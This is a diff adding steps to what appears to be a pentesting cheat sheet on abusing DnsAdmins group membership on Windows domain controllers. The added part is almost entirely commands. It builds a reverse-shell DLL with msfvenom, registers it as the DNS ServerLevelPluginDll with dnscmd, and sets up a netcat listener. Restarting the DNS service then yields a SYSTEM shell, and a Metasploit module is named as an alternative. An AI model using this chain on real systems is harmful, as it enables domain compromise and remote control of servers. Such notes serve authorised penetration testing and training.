@@ -49,3 +49,27 @@
 ### Check for successful previous command
 
     Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
+
+## OR
+
+### 1) Create reverse shell payload
+
+    msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=80 -f dll > exploit.dll
+
+### 2) Once the malicious DLL has been uploaded to the target the following command can be used to register the DLL.
+
+    dnscmd.exe <DCName> /config /serverlevelplugindll <PathToDLL>
+    dnscmd.exe dc01 /config /serverlevelplugindll C:\Users\Moe\Documents\exploit.dll
+
+### 3) Setu a listener on attacker machine
+
+    sudo nc -lvp 80
+
+### 4) From here stopping the DNS service and starting it again will spawn a SYSTEM shell to the netcat listener.
+
+    sc.exe stop dns
+    sc.exe start DNS
+
+## Alternate Method: Metasploit
+
+    use exploit/windows/local/dnsadmin_serverlevelplugindll
